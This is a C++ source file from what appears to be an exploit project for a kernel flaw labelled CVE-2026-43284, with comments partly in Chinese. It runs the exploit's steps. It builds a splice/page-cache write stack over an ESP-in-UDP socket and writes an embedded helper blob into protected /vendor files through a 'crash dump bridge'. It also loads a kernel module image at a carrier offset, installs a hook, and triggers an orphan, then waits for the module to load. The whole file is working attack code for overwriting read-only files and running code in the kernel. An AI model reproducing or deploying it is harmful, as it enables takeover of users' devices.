/** @file backend/cve_2026_43284/steps/pagecache_step_runner.cpp
 *  The step runner: build the page-cache stack for one step's target and call its body.
 *  Split out of pagecache_steps.cpp on purpose: the bodies are pure (they only need an access)
 *  and stay linkable without the ops; only the runner pulls the door, the splice surface and
 *  the access in.
 */
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "jni/gl_log.hpp"
#include "backend/cve_2026_43284/landing/crash_dump_bridge.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
#include "backend/cve_2026_43284/landing/encap_peer.hpp"
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"

#include <fcntl.h>
#include <unistd.h>

#include "backend/cve_2026_43284/kernel_access.hpp"
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

#include <cstdio>
#include <cstring>

namespace ghostlock::backend::cve_2026_43284::steps {
    namespace {
        inline constexpr const char* kNoAccess = "step-access-missing";
        inline constexpr const char* kWriteRefused = "step-write-refused";
        /** 模块镜像：一次读进静态缓冲（1 MiB 够放一个 .ko；字节从不进文档）。 */
        inline constexpr std::size_t kModuleImageBytes = 1U << 20U;
        [[nodiscard]] std::byte *module_image() noexcept {
            static std::byte buffer[kModuleImageBytes];
            return buffer;
        }
        [[nodiscard]] std::size_t read_module_image(const char *path) noexcept {
            if (path == nullptr || path[0] == '\0') { return 0U; }
            const int fd = ::open(path, O_RDONLY | O_CLOEXEC);
            if (fd < 0) { return 0U; }
            std::size_t used = 0U;
            while (used < kModuleImageBytes) {
                const ssize_t got = ::read(fd, module_image() + used, kModuleImageBytes - used);
                if (got <= 0) { break; }
                used += static_cast<std::size_t>(got);
            }
            static_cast<void>(::close(fd));
            return used;
        }

    }  // namespace
    StepOutcome run_pagecache_step(PagecacheStep step, StepContext &context, const char **refusal) noexcept {
        if (context.params == nullptr || context.door_path == nullptr || context.door_path[0] == '\0') {
            *refusal = kNoAccess;
            return StepOutcome::Refused;
        }
        /* The stack every step shares: one door on the file this step writes, the splice surface,
         *  the window, the landing, and the access on top. */
        /* ESP-in-UDP 的接收侧：内核把落在这个套接字上的报文交给 xfrm。生产环境里它由 App 的
         *  IpSec 会话持有（我们绑不上，EADDRINUSE 属正常）；自建 SA 的实验路线下由我们自己开。 */
        landing::EncapPeer encap_peer{};
        if (!encap_peer.open(context.params->sa.encap_port)) {
            static char peer_message[96] = {};
            std::snprintf(peer_message, sizeof(peer_message), "step-encap-peer-failed:%d",
                          encap_peer.error());
            *refusal = peer_message;
            return StepOutcome::Refused;
        }
        landing::PageCacheDoorLinux door(context.door_path, std::strlen(context.door_path));
        /* 打不开这个载体不是失败：机器文件（/vendor 下）本来就不许普通进程读，工具那套栈靠
         *  桥来读它、切它的页；门只保留套接字那一半。 */
        const int target_fd = door.open_target();
        landing::CrashDumpBridge bridge;
        landing::OldPageSource old_page{};
        landing::HelperWriteSource helper{};
        if (target_fd < 0) {
            const char *patch = context.patch_target != nullptr ? context.patch_target : context.door_path;
            if (!bridge.bind(patch, std::strlen(patch), context.door_path, std::strlen(context.door_path))) {
                *refusal = "step-bridge-unbound";
                return StepOutcome::Refused;
            }
            old_page = bridge.old_page();
            helper = bridge.helper();
        }
        /* 本次装配的来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:70-82
         *  —— 那边的写来源是 file_fd，App 打不开 vendor 文件时改用 patch #1 写下的 helper 桥；
         *  :129-167 的读同理。这里把这次装配的门、fd 与来源报出来，逐块的 fd 见窗口层）。 */
        GL_LOGI("runner: door=%s target_fd=%d bridge=%d encap_port=%u sa_set=%d width=%zu",
                context.door_path, target_fd, target_fd < 0 ? 1 : 0,
                static_cast<unsigned>(context.params->sa.encap_port),
                context.params->sa.set ? 1 : 0, landing::kWriteWidth);
        landing::RemoteDoor remote_door(door);
        landing::DoorOps &doors = target_fd < 0 ? static_cast<landing::DoorOps &>(remote_door)
                                             : static_cast<landing::DoorOps &>(door);
        landing::RealSpliceIo surface(landing::real_splice_io(), target_fd, 0, old_page, helper);
        landing::PageCacheWrite window(doors, surface);
        landing::PageCacheLanding landing(window);
        Access access(&landing);
        const auto up = access.initialize(*context.params);
        if (!up.ok()) {
            /* 两档失败要说清哪一档：参数不成套（BadParameters，来自 wire）与 landing 起不来
             *  （Failed，设备上的门/套接字）。 */
            *refusal = up.status == Access::AccessStatus::BadParameters ? "step-initialize-bad-params"
                                                                : "step-initialize-landing-failed";
            return StepOutcome::Refused;
        }
        const char *body_refusal = nullptr;
        bool ran = false;
        switch (step) {
            case PagecacheStep::Patch1: {
                WriteRequest request{};
                request.access = &access;
                request.params = context.params;
                /* 镜像由 backend 自己给：patch #1 就是内嵌的 helper。 */
                request.image = std::span<const std::byte>(
                        reinterpret_cast<const std::byte *>(embed::splicehelper_bytes()),
                        embed::splicehelper_padded_size());
                request.offset = 0U;
                request.width = 16U;
                /* patch #1 的镜像与来源（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:19-50
                 *  —— 那边 patch #1 = 内嵌 helper 按 kCrashDumpBlockBytes 逐块写进目标，offset 从 0 起）。 */
                GL_LOGI("patch1: image=%zu offset=%llu width=%zu blocks=%zu source_fd=%d bridge=%d",
                        request.image.size(), static_cast<unsigned long long>(request.offset), request.width,
                        (request.image.size() + request.width - 1U) / request.width, target_fd,
                        target_fd < 0 ? 1 : 0);
                ran = write_image_verified(request, &body_refusal);
                if (!ran && body_refusal != nullptr) {
                    /* 写入失败时把 splice 的失败码接在拒绝名后面：设备上就靠这个数。 */
                    static char detailed[128] = {};
                    std::snprintf(detailed, sizeof(detailed), "%s/splice=%d",
                                  body_refusal, window.last_error());
                    body_refusal = detailed;
                }

                break;
            }
            case PagecacheStep::Carrier: {
                WriteRequest request{};
                request.access = &access;
                request.params = context.params;
                /* 载体就是那个 .ko：按 wire 给的路径读进来（字节不进文档）。 */
                const std::size_t module_bytes = read_module_image(context.module_path);
                if (module_bytes == 0U) {
                    *refusal = "step-module-unreadable";
                    return StepOutcome::Refused;
                }
                request.image = std::span<const std::byte>(
                        reinterpret_cast<const std::byte *>(module_image()), module_bytes);
                request.offset = context.params->carrier_base;
                request.width = 16U;
                ran = write_image_verified(request, &body_refusal);
                break;
            }
            case PagecacheStep::Hook: {
                HookRequest request{};
                request.access = &access;
                request.params = context.params;
                request.plan = &context.params->hook_plan;
                request.width = 16U;
                ran = write_hook(request, &body_refusal);
                break;
            }
            case PagecacheStep::Trigger:
                body_refusal = trigger_orphan(context.delay_ms);
                ran = body_refusal == nullptr;
                break;
            case PagecacheStep::Wait:
                body_refusal = wait_for_module(context.wait);
                ran = body_refusal == nullptr;
                break;
        }
        /* 这一步的结果（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/crash_dump.cpp:44-50
         *  —— 那边的判据就是每块 write16 的返回码；组帧层的失败码另见 pagecache_write.hpp last_error）。 */
        GL_LOGI("runner: step=%s outcome=%s refusal=%s splice_error=%d",
                pagecache_step_name(step), ran ? "ran" : "refused",
                body_refusal != nullptr ? body_refusal : "(null)", window.last_error());
        static_cast<void>(access.shutdown());
        if (ran) { return StepOutcome::Ran; }
        *refusal = body_refusal == nullptr ? kWriteRefused : body_refusal;
        return StepOutcome::Refused;
    }
}  // namespace ghostlock::backend::cve_2026_43284::steps
